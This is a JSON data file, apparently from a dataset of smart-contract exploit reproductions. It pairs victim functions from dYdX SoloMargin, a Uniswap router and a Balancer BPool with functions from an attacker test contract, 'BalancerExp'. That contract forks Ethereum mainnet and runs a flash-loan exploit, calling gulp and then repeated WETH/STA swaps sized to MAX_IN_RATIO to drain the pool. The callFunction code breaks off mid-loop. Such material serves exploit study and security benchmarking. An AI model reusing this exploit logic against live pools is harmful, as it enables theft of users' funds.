[
  {
    "contract/interface": "ISoloMargin",
    "source_type": "victim_contract",
    "function_name": "operate",
    "original_code": "    function operate(\n        Storage.State storage state,\n        Account.Info[] memory accounts,\n        Actions.ActionArgs[] memory actions\n    )\n        public\n    {\n        Events.logOperation();\n\n        _verifyInputs(accounts, actions);\n\n        (\n            bool[] memory primaryAccounts,\n            Cache.MarketCache memory cache\n        ) = _runPreprocessing(\n            state,\n            accounts,\n            actions\n        );\n\n        _runActions(\n            state,\n            accounts,\n            actions,\n            cache\n        );\n\n        _verifyFinalState(\n            state,\n            accounts,\n            primaryAccounts,\n            cache\n        );\n    }\n\n    // ============ Helper Functions ============\n\n",
    "description": ""
  },
  {
    "contract/interface": "BalancerExp",
    "source_type": "attacker_contract",
    "function_name": "BONE",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "BalancerExp",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "BalancerExp",
    "source_type": "attacker_contract",
    "function_name": "MAX_IN_RATIO",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "BalancerExp",
    "source_type": "attacker_contract",
    "function_name": "callFunction",
    "original_code": "    function callFunction(\n        address, // sender\n        AccountInfo memory, // accountInfo\n        bytes memory // data\n    ) external {\n        // swap weth to sta\n        bpool.gulp(weth);\n        uint256 MaxinRatio = bmul(bpool.getBalance(weth), MAX_IN_RATIO);\n        bpool.swapExactAmountIn(weth, MaxinRatio - 1e18, sta, 0, 9999 * 1e18);\n        bpool.swapExactAmountIn(sta, IERC20(sta).balanceOf(address(this)), weth, 0, 9999 * 1e18);\n        MaxinRatio = bmul(bpool.getBalance(weth), MAX_IN_RATIO);\n        bpool.swapExactAmountIn(weth, (MaxinRatio * 50) / 100, sta, 0, 9999 * 1e18);\n        bpool.swapExactAmountIn(sta, IERC20(sta).balanceOf(address(this)), weth, 0, 9999 * 1e18);\n        MaxinRatio = bmul(bpool.getBalance(weth), MAX_IN_RATIO);\n        bpool.swapExactAmountIn(weth, (MaxinRatio * 25) / 100, sta, 0, 9999 * 1e18);\n        bpool.swapExactAmountIn(sta, IERC20(sta).balanceOf(address(this)), weth, 0, 9999 * 1e18);\n\n        for (uint256 i = 0; i < 16; i++) {\n            MaxinRatio = bmul(bpool.getBalance(weth), MAX_IN_RATIO);\n            if ((i + 1) < 9) {\n                bpool.swapExactAmountIn(weth, (MaxinRatio * (i + 1) * 10) / 100, sta, 0, 9999 * 1e18);\n            } else {\n                bpool.swapExactAmountIn(weth, (MaxinRatio * 95) / 100, sta, 0, 9999 * 1e18);\n            }\n",
    "description": ""
  },
  {
    "contract/interface": "BalancerExp",
    "source_type": "attacker_contract",
    "function_name": "donate",
    "original_code": "    function donate() public payable {}\n\n",
    "description": ""
  },
  {
    "contract/interface": "BalancerExp",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BalancerExp",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BalancerExp",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BalancerExp",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "BalancerExp",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 10_355_806);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BalancerExp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BalancerExp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BalancerExp",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BalancerExp",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "BalancerExp",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BalancerExp",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BalancerExp",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        // approve\n        IERC20(weth).approve(dydx, type(uint256).max);\n        IERC20(weth).approve(address(bpool), type(uint256).max);\n        IERC20(sta).approve(address(bpool), type(uint256).max);\n        IERC20(sta).approve(pancakeV2Router, type(uint256).max);\n\n        emit log_named_decimal_uint(\n            \"[Before Attack] Attacker WETH Balance : \", (IERC20(weth).balanceOf(address(this))), 18\n        );\n        emit log_named_decimal_uint(\n            \"[Before Attack] Attacker STA Balance : \", (IERC20(sta).balanceOf(address(this))), 18\n        );\n\n        // attack\n        attack();\n\n        // check profit\n        emit log_named_decimal_uint(\n            \"[After Attack] Attacker WETH Balance : \", (IERC20(weth).balanceOf(address(this))), 18\n        );\n        emit log_named_decimal_uint(\n            \"[After Attack] Attacker STA Balance : \", (IERC20(sta).balanceOf(address(this))), 18\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUniswapV2Router02",
    "source_type": "victim_contract",
    "function_name": "swapExactTokensForTokens",
    "original_code": "    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n",
    "description": ""
  },
  {
    "contract/interface": "BPool",
    "source_type": "victim_contract",
    "function_name": "getBalance",
    "original_code": "    function getBalance(address token)\n        external view\n        _viewlock_\n        returns (uint)\n    {\n\n        require(_records[token].bound, \"ERR_NOT_BOUND\");\n        return _records[token].balance;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BPool",
    "source_type": "victim_contract",
    "function_name": "gulp",
    "original_code": "    function gulp(address token)\n        external\n        _logs_\n        _lock_\n    {\n        require(_records[token].bound, \"ERR_NOT_BOUND\");\n        _records[token].balance = IERC20(token).balanceOf(address(this));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BPool",
    "source_type": "victim_contract",
    "function_name": "swapExactAmountIn",
    "original_code": "    function swapExactAmountIn(\n        address tokenIn,\n        uint tokenAmountIn,\n        address tokenOut,\n        uint minAmountOut,\n        uint maxPrice\n    )\n        external\n        _logs_\n        _lock_\n        returns (uint tokenAmountOut, uint spotPriceAfter)\n    {\n\n        require(_records[tokenIn].bound, \"ERR_NOT_BOUND\");\n        require(_records[tokenOut].bound, \"ERR_NOT_BOUND\");\n        require(_publicSwap, \"ERR_SWAP_NOT_PUBLIC\");\n\n        Record storage inRecord = _records[address(tokenIn)];\n        Record storage outRecord = _records[address(tokenOut)];\n\n        require(tokenAmountIn <= bmul(inRecord.balance, MAX_IN_RATIO), \"ERR_MAX_IN_RATIO\");\n\n        uint spotPriceBefore = calcSpotPrice(\n                                    inRecord.balance,\n                                    inRecord.denorm,\n                                    outRecord.balance,\n                                    outRecord.denorm,\n                                    _swapFee\n                                );\n        require(spotPriceBefore <= maxPrice, \"ERR_BAD_LIMIT_PRICE\");\n\n        tokenAmountOut = calcOutGivenIn(\n                            inRecord.balance,\n                            inRecord.denorm,\n                            outRecord.balance,\n                            outRecord.denorm,\n                            tokenAmountIn,\n                            _swapFee\n                        );\n        require(tokenAmountOut >= minAmountOut, \"ERR_LIMIT_OUT\");\n\n        inRecord.balance = badd(inRecord.balance, tokenAmountIn);\n        outRecord.balance = bsub(outRecord.balance, tokenAmountOut);\n\n        spotPriceAfter = calcSpotPrice(\n                                inRecord.balance,\n                                inRecord.denorm,\n                                outRecord.balance,\n                                outRecord.denorm,\n                                _swapFee\n                            );\n        require(spotPriceAfter >= spotPriceBefore, \"ERR_MATH_APPROX\");     \n        require(spotPriceAfter <= maxPrice, \"ERR_LIMIT_PRICE\");\n        require(spotPriceBefore <= bdiv(tokenAmountIn, tokenAmountOut), \"ERR_MATH_APPROX\");\n\n        emit LOG_SWAP(msg.sender, tokenIn, tokenOut, tokenAmountIn, tokenAmountOut);\n\n        _pullUnderlying(tokenIn, msg.sender, tokenAmountIn);\n        _pushUnderlying(tokenOut, msg.sender, tokenAmountOut);\n\n        return (tokenAmountOut, spotPriceAfter);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BPool",
    "source_type": "victim_contract",
    "function_name": "swapExactAmountOut",
    "original_code": "    function swapExactAmountOut(\n        address tokenIn,\n        uint maxAmountIn,\n        address tokenOut,\n        uint tokenAmountOut,\n        uint maxPrice\n    )\n        external\n        _logs_\n        _lock_ \n        returns (uint tokenAmountIn, uint spotPriceAfter)\n    {\n        require(_records[tokenIn].bound, \"ERR_NOT_BOUND\");\n        require(_records[tokenOut].bound, \"ERR_NOT_BOUND\");\n        require(_publicSwap, \"ERR_SWAP_NOT_PUBLIC\");\n\n        Record storage inRecord = _records[address(tokenIn)];\n        Record storage outRecord = _records[address(tokenOut)];\n\n        require(tokenAmountOut <= bmul(outRecord.balance, MAX_OUT_RATIO), \"ERR_MAX_OUT_RATIO\");\n\n        uint spotPriceBefore = calcSpotPrice(\n                                    inRecord.balance,\n                                    inRecord.denorm,\n                                    outRecord.balance,\n                                    outRecord.denorm,\n                                    _swapFee\n                                );\n        require(spotPriceBefore <= maxPrice, \"ERR_BAD_LIMIT_PRICE\");\n\n        tokenAmountIn = calcInGivenOut(\n                            inRecord.balance,\n                            inRecord.denorm,\n                            outRecord.balance,\n                            outRecord.denorm,\n                            tokenAmountOut,\n                            _swapFee\n                        );\n        require(tokenAmountIn <= maxAmountIn, \"ERR_LIMIT_IN\");\n\n        inRecord.balance = badd(inRecord.balance, tokenAmountIn);\n        outRecord.balance = bsub(outRecord.balance, tokenAmountOut);\n\n        spotPriceAfter = calcSpotPrice(\n                                inRecord.balance,\n                                inRecord.denorm,\n                                outRecord.balance,\n                                outRecord.denorm,\n                                _swapFee\n                            );\n        require(spotPriceAfter >= spotPriceBefore, \"ERR_MATH_APPROX\");\n        require(spotPriceAfter <= maxPrice, \"ERR_LIMIT_PRICE\");\n        require(spotPriceBefore <= bdiv(tokenAmountIn, tokenAmountOut), \"ERR_MATH_APPROX\");\n\n        emit LOG_SWAP(msg.sender, tokenIn, tokenOut, tokenAmountIn, tokenAmountOut);\n\n        _pullUnderlying(tokenIn, msg.sender, tokenAmountIn);\n        _pushUnderlying(tokenOut, msg.sender, tokenAmountOut);\n\n        return (tokenAmountIn, spotPriceAfter);\n    }\n\n\n",
    "description": ""
  }
]